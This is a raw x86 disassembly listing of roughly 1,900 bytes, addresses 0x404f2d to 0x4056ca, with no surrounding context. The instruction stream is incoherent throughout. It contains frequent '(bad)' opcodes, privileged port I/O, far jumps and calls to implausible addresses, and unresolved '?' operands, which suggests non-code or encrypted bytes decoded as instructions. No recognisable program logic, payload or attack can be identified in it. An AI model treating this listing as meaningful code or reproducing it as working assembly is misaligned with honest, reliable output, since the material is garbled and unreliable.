  404f2d:	addr16 cdq 
  404f2f:	xchg   edi,eax
  404f30:	ja     0x404f5f
  404f32:	pop    edx
  404f33:	jl     0x404f65
  404f35:	stc    
  404f36:	xchg   ecx,eax
  404f37:	loopne 0x404f55
  404f39:	pop    ss
  404f3a:	jmp    0x1cf06e2d
  404f3f:	jecxz  0x404f3f
  404f41:	inc    ebx
  404f42:	clc    
  404f43:	les    esp,FWORD PTR [ebx+0x62]
  404f46:	ret    
  404f47:	sub    BYTE PTR [edi+0x6ec0eec7],ah
  404f4d:	pop    esp
  404f4e:	xor    esp,DWORD PTR [esi]
  404f50:	aas    
  404f51:	lds    esi,FWORD PTR [eax-0x2cbdf647]
  404f57:	pop    ds
  404f58:	arpl   WORD PTR [edi],di
  404f5a:	adc    eax,0xb288583
  404f5f:	sbb    BYTE PTR [ecx],0x9d
  404f62:	dec    edi
  404f63:	push   ebx
  404f64:	(bad)  
  404f65:	pop    ebx
  404f66:	ror    BYTE PTR [eax],cl
  404f68:	or     ch,BYTE PTR [ecx+0x436a3065]
  404f6e:	loope  0x404f10
  404f70:	sbb    DWORD PTR [edx-0x2b],esi
  404f73:	daa    
  404f74:	pop    ebp
  404f75:	push   es
  404f76:	cmp    BYTE PTR [esi+0x31a14222],bl
  404f7c:	and    BYTE PTR [eax-0x5f75c2ed],bl
  404f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f83:	xor    edi,ebp
  404f85:	adc    DWORD PTR [esi+0x59151649],eax
  404f8b:	mov    esp,0x5fc6db89
  404f90:	add    al,0x57
  404f92:	mov    esp,0x8893e8ab
  404f97:	ficom  WORD PTR [edi+0x38dc1eed]
  404f9d:	mov    dh,0x7a
  404f9f:	ret    
  404fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fa1:	or     ah,BYTE PTR [esi]
  404fa3:	aam    0x80
  404fa5:	jg     0x404fa5
  404fa7:	pop    ebx
  404fa8:	jmp    0xa989402c
  404fad:	stos   BYTE PTR es:[edi],al
  404fae:	and    al,0x51
  404fb0:	push   es
  404fb1:	push   edx
  404fb2:	sub    al,0xa
  404fb4:	cld    
  404fb5:	dec    ebx
  404fb6:	cmc    
  404fb7:	mov    edi,0xcc855bc9
  404fbc:	xor    BYTE PTR [ebx+0x6fbb2b3a],al
  404fc2:	inc    esp
  404fc3:	(bad)  
  404fc4:	in     eax,0xc8
  404fc6:	inc    esi
  404fc7:	mov    ebp,0x30014f7d
  404fcc:	rcl    BYTE PTR [ebp-0x23],0x46
  404fd0:	icebp  
  404fd1:	popf   
  404fd2:	mov    edi,0x65870f08
  404fd7:	out    0xc5,al
  404fd9:	sub    eax,0xce125894
  404fde:	mov    WORD PTR [ecx+ebp*2-0x53],ss
  404fe2:	xor    DWORD PTR [ebx+ebp*4+0x230e6c0a],edi
  404fe9:	retf   0xa7d9
  404fec:	sub    al,0xd8
  404fee:	out    0x41,eax
  404ff0:	retf   
  404ff1:	pop    esi
  404ff2:	mov    eax,0x4062f511
  404ff7:	cmc    
  404ff8:	dec    esp
  404ff9:	push   ebp
  404ffa:	stc    
  404ffb:	dec    ebp
  404ffc:	mov    edi,DWORD PTR [ecx-0x5e]
  404fff:	(bad)  
  405000:	xor    eax,0x35464624
  405005:	cli    
  405006:	xor    DWORD PTR [edx-0x49],esp
  405009:	inc    esp
  40500a:	mov    bh,0xd
  40500c:	jg     0x404ff0
  40500e:	fist   DWORD PTR [ebp+0x36]
  405011:	cmp    DWORD PTR [ebp+0x3b],0x737c0f86
  405018:	jmp    FWORD PTR es:[ecx+0x62]
  40501c:	mov    cl,BYTE PTR [esi+0x37bca6e5]
  405022:	loope  0x404fbd
  405024:	lods   eax,DWORD PTR ds:[esi]
  405025:	adc    ch,BYTE PTR [edi+0x63]
  405028:	mov    esi,ebx
  40502a:	xchg   edx,eax
  40502b:	fbstp  TBYTE PTR [eax+0x59]
  40502e:	inc    BYTE PTR [eax+0x6]
  405031:	aas    
  405032:	cmp    cl,bh
  405034:	pusha  
  405035:	std    
  405036:	call   esi
  405038:	push   0x13de575d
  40503d:	dec    esp
  40503e:	inc    ebx
  40503f:	xchg   ebx,eax
  405040:	or     eax,0x5f236b6b
  405045:	imul   ecx,esi,0x2fce8e16
  40504b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40504c:	mov    ebp,0xe258a159
  405051:	jae    0x40506f
  405053:	and    bl,BYTE PTR [edx-0x5e]
  405056:	imul   ecx,DWORD PTR [esi+0x42],0xffffffad
  40505a:	xlat   BYTE PTR ds:[ebx]
  40505b:	daa    
  40505c:	push   0xfffffff1
  40505e:	iret   
  40505f:	addr16 femms 
  405062:	int3   
  405063:	xlat   BYTE PTR ds:[ebx]
  405064:	dec    esi
  405065:	jg     0x4050b6
  405067:	clc    
  405068:	pop    edi
  405069:	(bad)  
  40506b:	sub    BYTE PTR [ebx+0x74],cl
  40506e:	ss pop edx
  405070:	jl     0x4050bb
  405072:	or     eax,0x5bc82fbd
  405077:	jmp    0x600b2570
  40507c:	iret   
  40507d:	push   es
  40507e:	retf   0xd60d
  405081:	outs   dx,BYTE PTR ds:[esi]
  405082:	inc    ecx
  405083:	js     0x405059
  405085:	sub    BYTE PTR [eax],bl
  405087:	ret    0x782b
  40508a:	sti    
  40508b:	(bad)  
  40508c:	sti    
  40508d:	ror    DWORD PTR [ebp+eiz*4+0x61],cl
  405091:	mov    esi,0xd86b1d43
  405096:	retf   
  405097:	dec    ebp
  405098:	mov    ebp,0x1bfe673d
  40509d:	lds    edx,FWORD PTR [edx]
  40509f:	fwait
  4050a0:	xchg   edi,eax
  4050a1:	into   
  4050a2:	jp     0x405102
  4050a4:	in     eax,dx
  4050a5:	xor    DWORD PTR [ebp-0x3d],0x4351d289
  4050ac:	cmp    BYTE PTR [edi+eax*2-0x3e],bh
  4050b0:	int3   
  4050b1:	and    ecx,DWORD PTR [edx]
  4050b3:	lock dec esi
  4050b5:	and    dl,ah
  4050b7:	scas   al,BYTE PTR es:[edi]
  4050b8:	fs popf 
  4050ba:	and    DWORD PTR [ecx+esi*8-0x29],eax
  4050be:	xchg   ecx,eax
  4050bf:	mov    esi,0xb18e1918
  4050c4:	mov    ah,0x64
  4050c6:	xchg   BYTE PTR [ebx+0x55],dl
  4050c9:	mov    dl,0x60
  4050cb:	repnz mov al,0x4d
  4050ce:	cmp    eax,0x389fa60a
  4050d3:	loopne 0x405107
  4050d5:	stos   BYTE PTR es:[edi],al
  4050d6:	mov    esp,ecx
  4050d8:	jge    0x405087
  4050da:	jnp    0x4050bb
  4050dc:	and    al,0x77
  4050de:	jmp    0x4050b0
  4050e0:	cmp    eax,0xc7b80a3e
  4050e5:	(bad)
  4050e9:	xchg   edx,eax
  4050ea:	bound  esi,QWORD PTR [ecx]
  4050ec:	mov    dl,0x17
  4050ee:	and    BYTE PTR [esi+ebx*8],bl
  4050f1:	jl     0x4050e6
  4050f3:	mov    DWORD PTR [edi],edi
  4050f5:	mov    dh,0x3a
  4050f7:	dec    edx
  4050f8:	xchg   ebx,eax
  4050f9:	jp     0x405081
  4050fb:	inc    edi
  4050fc:	xchg   esp,eax
  4050fd:	push   ecx
  4050fe:	push   eax
  4050ff:	sub    eax,0x64d112f9
  405104:	rcl    DWORD PTR [edx],0xdc
  405107:	mov    ah,0x82
  405109:	xor    al,0x86
  40510b:	loopne 0x40514f
  40510d:	push   eax
  40510e:	ret    
  40510f:	dec    eax
  405110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405111:	mov    ds:0xe230bc70,eax
  405116:	xor    bl,BYTE PTR [ebx]
  405118:	nop
  405119:	inc    ebp
  40511b:	or     eax,0xdaff8a10
  405120:	xchg   ecx,eax
  405121:	mov    bh,0xcc
  405123:	pop    esp
  405124:	stos   DWORD PTR es:[edi],eax
  405125:	xlat   BYTE PTR ds:[ebx]
  405126:	pop    es
  405127:	test   ebx,eax
  405129:	mov    DWORD PTR ds:0x1abcfb88,ebx
  40512f:	(bad)  
  405130:	sbb    eax,0x88a185f9
  405135:	fld    st(3)
  405137:	xchg   esp,eax
  405138:	push   esi
  405139:	lods   al,BYTE PTR ds:[esi]
  40513a:	or     ah,al
  40513c:	inc    ebp
  40513d:	and    dh,bh
  40513f:	dec    ecx
  405140:	inc    ebx
  405141:	and    ch,bh
  405143:	fidiv  DWORD PTR [edi-0x6c73e97f]
  405149:	mov    cl,0x32
  40514b:	shl    esp,1
  40514d:	or     DWORD PTR [eax],ebp
  40514f:	mov    dh,0x61
  405151:	fsubr  QWORD PTR [ecx]
  405153:	mov    DWORD PTR [edx-0x2b],esi
  405156:	sbb    al,0x16
  405158:	mov    ss,WORD PTR [esi]
  40515a:	sbb    BYTE PTR [esi+ebx*8],dl
  40515d:	loope  0x40516f
  40515f:	leave  
  405160:	test   al,0xec
  405162:	(bad)  
  405163:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405165:	mov    al,0x76
  405167:	(bad)  
  405168:	jnp    0x40517e
  40516a:	out    dx,eax
  40516b:	mov    ebx,0x3a143f73
  405170:	pop    ebp
  405171:	pop    edx
  405172:	addr16 in eax,dx
  405174:	dec    ebx
  405175:	ins    DWORD PTR es:[edi],dx
  405176:	and    ebp,DWORD PTR [ebx+0x28]
  405179:	repnz addr16 mov esp,0xba81f
  405180:	pop    esi
  405181:	mov    eax,ds:0x8bf802b9
  405186:	cmp    ah,BYTE PTR [edi+0x7aeb87fa]
  40518c:	scas   al,BYTE PTR es:[edi]
  40518d:	loope  0x4051c0
  40518f:	and    BYTE PTR [edi+0x3f],ch
  405192:	fdiv   DWORD PTR [ebx+0x5d]
  405195:	pop    edi
  405196:	rcr    cl,cl
  405198:	jns    0x4051b5
  40519a:	into   
  40519b:	push   eax
  40519c:	xchg   ebp,eax
  40519d:	fwait
  40519e:	call   0x41c6:0x36e9e8e7
  4051a5:	xor    BYTE PTR [edi],dl
  4051a7:	outs   dx,BYTE PTR ds:[esi]
  4051a8:	shl    DWORD PTR gs:[edx+0x10],1
  4051ac:	stos   BYTE PTR es:[edi],al
  4051ad:	xchg   edi,eax
  4051ae:	xor    cl,ch
  4051b0:	stos   DWORD PTR es:[edi],eax
  4051b1:	mov    DWORD PTR es:[esi],ebx
  4051b4:	inc    esi
  4051b5:	push   0xffffff82
  4051b7:	loopne 0x4051f6
  4051b9:	jnp    0x4051e9
  4051bb:	add    eax,edi
  4051bd:	scas   eax,DWORD PTR es:[edi]
  4051be:	push   edi
  4051bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c0:	inc    eax
  4051c1:	jmp    0x28e7:0xcaf52a53
  4051c8:	push   edx
  4051c9:	sub    eax,DWORD PTR [edx]
  4051cb:	imul   eax,DWORD PTR [edx-0x75],0x654e29f7
  4051d2:	push   esi
  4051d3:	test   edi,esp
  4051d5:	mov    BYTE PTR es:[edi],al
  4051d8:	xor    al,0x21
  4051da:	push   0x3
  4051dc:	fs xchg edx,eax
  4051de:	sbb    eax,0xb57353fa
  4051e3:	call   0x1d5682cc
  4051e8:	jns    0x405185
  4051ea:	pushf  
  4051eb:	pop    ebx
  4051ec:	ins    BYTE PTR es:[edi],dx
  4051ed:	sar    DWORD PTR [ebx],1
  4051ef:	jle    0x40523c
  4051f1:	sbb    ebp,DWORD PTR [edi+0x62]
  4051f4:	and    esi,esi
  4051f6:	push   ds
  4051f7:	push   ebx
  4051f8:	xor    ebp,esp
  4051fa:	jnp    0x40523f
  4051fc:	cmp    bl,BYTE PTR [ebx]
  4051fe:	pop    esp
  4051ff:	sti    
  405200:	lea    eax,[esp+ecx*4-0x121a608c]
  405207:	pop    ebp
  405208:	pop    es
  405209:	rcl    DWORD PTR [edx],0xd4
  40520c:	arpl   WORD PTR [ebx+0x24],bx
  40520f:	shl    ebp,1
  405211:	and    ebp,DWORD PTR [edi-0x6f]
  405214:	dec    eax
  405215:	mov    dh,0xca
  405217:	pop    eax
  405218:	mov    dl,0x9c
  40521a:	xor    dl,BYTE PTR [edx-0x67]
  40521d:	or     bh,bh
  40521f:	add    al,0x43
  405221:	std    
  405222:	add    al,0x54
  405224:	repnz dec BYTE PTR [ebp+0x40596968]
  40522b:	ins    DWORD PTR es:[edi],dx
  40522c:	and    ecx,DWORD PTR [ecx-0x52]
  40522f:	imul   edi,DWORD PTR [ecx+edx*8-0x57],0x28
  405234:	rcr    ebx,0x85
  405237:	lds    ecx,FWORD PTR [ecx]
  405239:	retf   0x3ee5
  40523c:	lock scas eax,DWORD PTR es:[edi]
  40523e:	mov    ds:0xe016d2d6,eax
  405243:	shl    ch,cl
  405245:	xchg   ebx,eax
  405246:	inc    ebx
  405247:	dec    edx
  405248:	mov    eax,0xe3f8d155
  40524d:	xor    al,0x2f
  40524f:	into   
  405250:	fsubr  st(1),st
  405252:	dec    ebp
  405253:	fcomp  DWORD PTR [ecx+0x71]
  405256:	mov    cl,0xbe
  405258:	jge    0x40529d
  40525a:	xchg   BYTE PTR [eax],dh
  40525c:	(bad)
  40525f:	bound  esi,QWORD PTR [ebx-0x6e6baff2]
  405265:	inc    ecx
  405266:	or     ebx,DWORD PTR [ebp-0x71]
  405269:	scas   al,BYTE PTR es:[edi]
  40526a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40526b:	mov    ebp,ecx
  40526d:	pop    ds
  40526e:	stos   BYTE PTR es:[edi],al
  40526f:	mov    dh,0x4d
  405271:	ds xchg ebp,eax
  405273:	mov    eax,0x506262c8
  405278:	mov    dl,0x13
  40527a:	mov    dh,0x5a
  40527c:	arpl   WORD PTR [edx],ax
  40527e:	push   esp
  40527f:	aas    
  405280:	and    ebp,0xffffffe3
  405283:	jmp    0x21084723
  405288:	xchg   esi,eax
  405289:	mov    WORD PTR [ebx],ax
  40528c:	adc    eax,0x39db4d55
  405291:	fsub   QWORD PTR [eax+0x31dd4a4d]
  405297:	sub    al,0xd2
  405299:	mov    dh,0x53
  40529b:	inc    edx
  40529c:	adc    dh,cl
  40529e:	bnd lock jle 0x4052df
  4052a2:	mov    bh,0x13
  4052a4:	fst    QWORD PTR [ebx+0x7a]
  4052a7:	add    esp,DWORD PTR [eax-0x4b317eea]
  4052ad:	mov    ebx,0xf125f69b
  4052b2:	inc    ebx
  4052b3:	pop    ebp
  4052b4:	mov    edx,0x79264717
  4052b9:	cld    
  4052ba:	cmp    DWORD PTR [edi-0x6d9ad485],ecx
  4052c0:	jns    0x405324
  4052c2:	xlat   BYTE PTR ds:[ebx]
  4052c3:	inc    esp
  4052c4:	dec    edi
  4052c5:	imul   esp,DWORD PTR [ebp+0x238ff171],0x22
  4052cc:	retf   
  4052cd:	imul   edx,DWORD PTR [edi-0x13],0xba89da55
  4052d4:	popf   
  4052d5:	xchg   BYTE PTR [ecx+0x4b],cl
  4052d8:	push   ds
  4052d9:	cmp    ecx,DWORD PTR [ebx]
  4052db:	xor    DWORD PTR [eax],0x3b1698d8
  4052e1:	ror    BYTE PTR [edi],1
  4052e3:	jmp    0x4052b9
  4052e5:	jns    0x4052fd
  4052e7:	mov    eax,0x7ca21f13
  4052ec:	pop    esp
  4052ed:	loopne 0x4052b3
  4052ef:	push   esp
  4052f0:	repnz fadd DWORD PTR [ecx-0x524a9b1e]
  4052f7:	iret   
  4052f8:	pusha  
  4052f9:	mov    BYTE PTR [edx],ch
  4052fb:	fcmovnu st,st(3)
  4052fd:	jb     0x40536a
  4052ff:	in     al,dx
  405300:	daa    
  405301:	inc    ebp
  405302:	xor    al,0x82
  405304:	sbb    edx,ebp
  405306:	ret    0x2542
  405309:	dec    ebx
  40530a:	dec    ecx
  40530b:	push   0x71893cc2
  405310:	jge    0x405314
  405312:	and    eax,0x8019fd51
  405317:	test   BYTE PTR [esi+0x3],0x20
  40531b:	mov    al,ds:0xeb3037
  405320:	ror    DWORD PTR [esi+0xc42adab],1
  405326:	jmp    0x7103e766
  40532b:	push   es
  40532c:	cld    
  40532d:	les    esi,FWORD PTR [esi+0x304a976e]
  405333:	cdq    
  405334:	repnz pop edx
  405336:	or     ebp,edi
  405338:	sahf   
  405339:	js     0x4052cb
  40533b:	out    0x21,al
  40533d:	push   ds
  40533e:	cmp    ebp,ecx
  405340:	mov    cl,0x16
  405342:	hlt    
  405343:	std    
  405344:	jge    0x405322
  405346:	mov    edx,0x7904bf79
  40534b:	mov    eax,0x4de3fa92
  405350:	fbstp  TBYTE PTR [edx]
  405352:	xchg   esp,eax
  405353:	xchg   esi,eax
  405354:	das    
  405355:	shl    DWORD PTR [eax-0x3f360917],0x63
  40535c:	lods   al,BYTE PTR ds:[esi]
  40535d:	fsubr  st(6),st
  40535f:	sbb    al,0x1b
  405361:	(bad)  
  405362:	mov    ecx,0xd5e0c113
  405367:	ret    
  405368:	pop    eax
  405369:	pop    es
  40536a:	fbld   TBYTE PTR [edx+0x56386545]
  405370:	add    ebp,esp
  405372:	(bad)  
  405374:	xor    al,0x2b
  405376:	int    0x85
  405378:	jnp    0x4053f7
  40537a:	fwait
  40537b:	or     eax,0x692f328f
  405380:	jmp    0xed2a:0xcd3ed066
  405387:	in     al,0x92
  405389:	ins    BYTE PTR es:[edi],dx
  40538a:	push   es
  40538b:	loope  0x4053cd
  40538d:	test   DWORD PTR [eax+0x21de91f8],0xbd37c9a9
  405397:	je     0x40539f
  405399:	mov    esi,0x189e714
  40539e:	aad    0x54
  4053a0:	and    DWORD PTR [eax+0x7e],ebx
  4053a3:	fsub   QWORD PTR [ecx-0x752c6ef5]
  4053a9:	pushf  
  4053aa:	and    eax,edx
  4053ac:	fdivrp st(0),st
  4053ae:	gs mov edx,0xfbd84242
  4053b4:	xchg   ecx,eax
  4053b5:	cmc    
  4053b6:	jb     0x4053ac
  4053b8:	and    al,al
  4053ba:	mov    ah,0x28
  4053bc:	test   eax,0xad010b04
  4053c1:	jno    0x4053c0
  4053c3:	cs daa 
  4053c5:	push   cs
  4053c6:	jle    0x4053be
  4053c8:	sbb    ch,bl
  4053ca:	and    eax,0x868d118b
  4053cf:	jmp    0x405369
  4053d1:	aas    
  4053d2:	sub    edi,DWORD PTR [edx+0x8]
  4053d5:	add    al,0xa8
  4053d7:	ffree  st(1)
  4053d9:	fistp  DWORD PTR es:[esi+ebp*2-0x7698385f]
  4053e1:	or     al,0x59
  4053e3:	mov    esp,0x697b910f
  4053e8:	xchg   ecx,eax
  4053e9:	sub    BYTE PTR ds:0xe582987e,bh
  4053ef:	mov    edi,0x1a88364d
  4053f4:	xor    eax,0x92a028fb
  4053f9:	(bad)  
  4053fa:	mul    BYTE PTR [ebx]
  4053fc:	stc    
  4053fd:	arpl   WORD PTR [ebx+0x19],ax
  405400:	cmp    bh,BYTE PTR [ebx]
  405402:	pop    esp
  405403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405404:	retf   
  405405:	cmp    DWORD PTR [edx-0x19460415],edi
  40540b:	or     al,0x9d
  40540d:	cli    
  40540e:	jno    0x405392
  405410:	or     ebx,DWORD PTR [ebp+0x46f03919]
  405416:	mov    eax,0x65448faf
  40541b:	push   ss
  40541c:	iret   
  40541d:	test   al,0x6d
  40541f:	jb     0x4053ad
  405421:	gs adc al,ch
  405424:	mov    bl,0x3a
  405426:	cmp    eax,0x8bae9653
  40542b:	stos   BYTE PTR es:[edi],al
  40542c:	loope  0x405445
  40542e:	ja     0x4054a5
  405430:	fsubr  QWORD PTR [esi*2+0x3b75ae4e]
  405437:	lds    ecx,FWORD PTR [edx+0x3f3a302b]
  40543d:	fbld   TBYTE PTR [edx-0x64]
  405440:	push   ebp
  405441:	cdq    
  405442:	cmp    eax,0x6405431e
  405447:	cmp    ch,BYTE PTR [eax]
  405449:	scas   eax,DWORD PTR es:[edi]
  40544a:	adc    eax,0xdbbc7964
  40544f:	fwait
  405450:	push   cs
  405451:	lahf   
  405452:	inc    ebx
  405453:	(bad)  
  405454:	pop    edi
  405455:	cli    
  405456:	aad    0x86
  405458:	dec    esi
  405459:	stos   BYTE PTR es:[edi],al
  40545a:	jbe    0x405450
  40545c:	mov    ds:0x510f4920,eax
  405461:	fisttp DWORD PTR [edi]
  405463:	push   ebp
  405464:	cli    
  405465:	arpl   WORD PTR [ebx+0x42],bx
  405468:	stos   BYTE PTR es:[edi],al
  405469:	push   ds
  40546a:	push   edx
  40546b:	adc    edi,0x3f
  40546e:	repnz cmc 
  405470:	cmp    BYTE PTR [esi+esi*1+0x2e3801df],cl
  405477:	fs jno 0x405471
  40547a:	loop   0x4054f8
  40547c:	sub    edi,DWORD PTR [ebx]
  40547e:	lahf   
  40547f:	mov    bl,al
  405481:	inc    edx
  405482:	mov    DWORD PTR [edx+0xa22e585],ecx
  405488:	inc    eax
  405489:	ss in  eax,0x8e
  40548c:	push   edi
  40548d:	stos   DWORD PTR es:[edi],eax
  40548e:	ja     0x405478
  405490:	cmp    al,0x94
  405492:	fldcw  WORD PTR [esi]
  405494:	pop    edx
  405495:	mov    ds:0xee0fbcf6,eax
  40549a:	xchg   esi,eax
  40549b:	(bad)  
  40549d:	test   al,0x87
  40549f:	sbb    edi,esp
  4054a1:	fcom   QWORD PTR [esi]
  4054a3:	fisttp QWORD PTR [ecx+0x5d]
  4054a6:	mov    al,0x55
  4054a8:	xchg   ebp,eax
  4054a9:	loope  0x4054ac
  4054ab:	pop    ds
  4054ac:	int3   
  4054ad:	aas    
  4054ae:	fdiv   QWORD PTR [edi+eiz*1+0x40]
  4054b2:	loop   0x40551f
  4054b4:	mov    cl,0x98
  4054b6:	stos   BYTE PTR es:[edi],al
  4054b7:	in     eax,0xd0
  4054b9:	inc    ebp
  4054ba:	cmc    
  4054bb:	mov    esp,DWORD PTR [edi+0x4b13b7b3]
  4054c1:	repnz cmp al,0x97
  4054c4:	lahf   
  4054c5:	test   DWORD PTR [ebx+0x1f],eax
  4054c8:	lods   al,BYTE PTR ds:[esi]
  4054c9:	push   eax
  4054ca:	mov    edx,0x4e70e84a
  4054cf:	or     BYTE PTR [ecx-0x4f48691d],0x7c
  4054d6:	cwde   
  4054d7:	stos   DWORD PTR es:[edi],eax
  4054d8:	(bad)  
  4054d9:	enter  0x6962,0xa5
  4054dd:	leave  
  4054de:	lahf   
  4054df:	rol    dl,cl
  4054e1:	stos   BYTE PTR es:[edi],al
  4054e2:	fiadd  WORD PTR [esi]
  4054e4:	inc    ebp
  4054e5:	add    ch,BYTE PTR [ecx+0x35fe9faf]
  4054eb:	scas   al,BYTE PTR es:[edi]
  4054ec:	jmp    0x4054cc
  4054ee:	ds jecxz 0x405538
  4054f1:	pusha  
  4054f2:	or     eax,ecx
  4054f4:	les    ebp,FWORD PTR [edx-0x2f]
  4054f7:	or     eax,0xff23346c
  4054fc:	add    BYTE PTR [eax+0x51c1a95b],ah
  405502:	add    al,0xd2
  405504:	mov    ds:0xf37f26ea,eax
  405509:	jmp    0x4054c6
  40550b:	inc    edi
  40550c:	inc    edx
  40550d:	scas   al,BYTE PTR es:[edi]
  40550e:	jp     0x405495
  405510:	jae    0x4054dd
  405512:	hlt    
  405513:	jae    0x405515
  405515:	in     al,dx
  405516:	daa    
  405517:	fs jne 0x4054e3
  40551a:	mov    ah,0xc5
  40551c:	les    ebx,FWORD PTR [ebx-0xa]
  40551f:	int    0xc0
  405521:	mov    dl,0x20
  405523:	or     eax,0xe176f506
  405528:	mov    bl,0x2b
  40552a:	add    bh,BYTE PTR [ecx]
  40552c:	call   0x1d78092e
  405531:	push   esp
  405532:	cmp    al,0x3c
  405534:	out    dx,al
  405535:	xchg   ebp,eax
  405536:	neg    ecx
  405538:	aam    0x15
  40553a:	cmc    
  40553b:	cmp    dh,bl
  40553d:	inc    ecx
  40553e:	stos   BYTE PTR es:[edi],al
  40553f:	imul   ebp,DWORD PTR [edx+0xd],0xc557c01f
  405546:	inc    ecx
  405547:	inc    ebp
  405548:	aaa    
  405549:	jp     0x4054f6
  40554b:	jns    0x405532
  40554d:	inc    ebx
  40554e:	adc    BYTE PTR [ecx+0x28],dh
  405551:	leave  
  405552:	pop    edi
  405553:	xor    al,0xbe
  405555:	adc    cl,BYTE PTR [ebx]
  405557:	push   ecx
  405558:	(bad)
  40555c:	dec    ecx
  40555d:	not    BYTE PTR [esi-0x40]
  405560:	es mov eax,0x80868387
  405566:	lahf   
  405567:	mov    ebx,0x235a37dd
  40556c:	jb     0x4054f1
  40556e:	leave  
  40556f:	or     eax,0x688b3502
  405574:	sbb    cl,BYTE PTR [esi+0x70099273]
  40557a:	neg    DWORD PTR [ecx-0x5]
  40557d:	push   ebx
  40557e:	call   0xfe51:0x6f0a93cd
  405585:	or     DWORD PTR [edi],esp
  405587:	mov    al,ds:0x5df17ab5
  40558c:	(bad)  
  40558e:	loope  0x405595
  405590:	in     eax,0x1c
  405592:	or     al,0xc3
  405594:	loop   0x405610
  405596:	rcl    BYTE PTR [ecx-0x74],cl
  405599:	push   edi
  40559a:	pop    edi
  40559b:	stc    
  40559c:	mov    cl,0xf
  40559e:	ins    DWORD PTR es:[edi],dx
  40559f:	in     eax,dx
  4055a0:	xchg   edx,eax
  4055a1:	mov    bh,0x49
  4055a3:	push   es
  4055a4:	div    BYTE PTR [eax+0x6f]
  4055a7:	sub    eax,0x4dba4e
  4055ac:	push   eax
  4055ad:	or     ecx,DWORD PTR [edx]
  4055af:	out    0xa0,al
  4055b1:	sub    al,0x7f
  4055b3:	inc    edi
  4055b4:	sbb    edi,ecx
  4055b6:	clc    
  4055b7:	pop    edi
  4055b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b9:	add    eax,0x81548604
  4055be:	ret    0xc776
  4055c1:	leave  
  4055c2:	push   esp
  4055c3:	jp     0x405565
  4055c5:	xchg   edi,eax
  4055c6:	and    al,cl
  4055c8:	push   cs
  4055c9:	xchg   esi,eax
  4055ca:	mov    edi,0x4beaaf94
  4055cf:	jb     0x40561f
  4055d1:	in     al,0x9f
  4055d3:	pop    ebx
  4055d4:	jl     0x40564f
  4055d6:	cli    
  4055d7:	xchg   esp,eax
  4055d8:	mov    ecx,0xe4ceb00
  4055dd:	es mov ah,0xa0
  4055e0:	sbb    al,0xa7
  4055e2:	dec    ebp
  4055e3:	xor    bh,BYTE PTR [ebx-0x65dfc50c]
  4055e9:	ja     0x405575
  4055eb:	push   ebx
  4055ec:	jne    0x405581
  4055ee:	jb     0x405614
  4055f0:	int3   
  4055f1:	arpl   WORD PTR [ecx-0x4bc21256],bp
  4055f7:	xor    al,0x9c
  4055f9:	dec    ecx
  4055fa:	sbb    BYTE PTR [eax-0x6],dl
  4055fd:	imul   edx,DWORD PTR [esi-0x5303517e],0x6a
  405604:	push   es
  405605:	jno    0x405681
  405607:	and    BYTE PTR [ebx+ebx*2],dh
  40560a:	jne    0x405631
  40560c:	and    BYTE PTR [edx-0x70f9330a],0x7d
  405613:	jl     0x4055fd
  405615:	ss adc ch,dl
  405618:	test   BYTE PTR [ebp-0xd],dl
  40561b:	sar    BYTE PTR [eax-0x1f],cl
  40561e:	cmp    dl,BYTE PTR [eax-0x6d]
  405621:	mov    ds:0xf0cc3ed7,al
  405626:	aas    
  405627:	pop    ebp
  405628:	inc    ebx
  405629:	int    0x7a
  40562b:	mov    DWORD PTR [ebp-0x77],esi
  40562e:	ror    DWORD PTR [ecx-0x4b],1
  405631:	(bad)  
  405632:	and    eax,0x8a8f4981
  405637:	out    0x75,eax
  405639:	inc    esp
  40563a:	sbb    ebx,DWORD PTR [esi+0x1064706f]
  405640:	xor    DWORD PTR [ebp-0x36],edi
  405643:	cwde   
  405644:	aad    0x29
  405646:	xchg   ecx,eax
  405647:	pushf  
  405648:	js     0x405696
  40564a:	imul   BYTE PTR [ecx+edx*1]
  40564d:	hlt    
  40564e:	ins    BYTE PTR es:[edi],dx
  40564f:	cwde   
  405650:	out    0x57,eax
  405652:	sar    DWORD PTR [edx+0x1f],0x7f
  405656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405657:	mov    ?,WORD PTR [eax+0x3b2e4aa]
  40565d:	jo     0x405630
  40565f:	test   eax,0x68bdfcfc
  405664:	lods   al,BYTE PTR ds:[esi]
  405665:	or     ecx,eax
  405667:	adc    esp,edi
  405669:	mov    eax,ds:0xfe02b136
  40566e:	ds add ebp,ecx
  405671:	mov    WORD PTR [ecx+0x59],?
  405674:	loop   0x4056df
  405676:	jle    0x4056ef
  405678:	sbb    cl,BYTE PTR [ebx+0x418465e8]
  40567e:	xchg   edi,eax
  40567f:	cmp    esp,DWORD PTR [edx]
  405681:	fld    QWORD PTR [edi]
  405683:	mov    al,0x28
  405685:	fs xchg esp,eax
  405687:	test   al,0x3b
  405689:	aas    
  40568a:	in     eax,dx
  40568b:	cmp    BYTE PTR [edi],dl
  40568d:	push   ds
  40568e:	ss daa 
  405690:	aaa    
  405691:	call   0xb586691e
  405696:	or     BYTE PTR [ecx+0x3c],al
  405699:	mov    eax,0xc481ba4
  40569e:	mov    ebx,esi
  4056a0:	jl     0x4056b6
  4056a2:	adc    eax,0xc8e7785d
  4056a7:	rcl    edx,0xf8
  4056aa:	outs   dx,BYTE PTR ds:[esi]
  4056ab:	add    cl,bh
  4056ad:	fisttp DWORD PTR [esp+esi*2-0x25]
  4056b1:	sbb    DWORD PTR [edi+0x4a],edx
  4056b4:	(bad)  
  4056b5:	mov    dh,0xad
  4056b7:	daa    
  4056b8:	lods   al,BYTE PTR ds:[esi]
  4056b9:	ja     0x405704
  4056bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056bc:	and    edx,eax
  4056be:	pushw  cs
  4056c0:	inc    edx
  4056c1:	mov    edi,0x21c9d212
  4056c6:	out    dx,al
  4056c7:	jge    0x405719
  4056c9:	dec    esp
  4056ca:	xchg   edi,eax
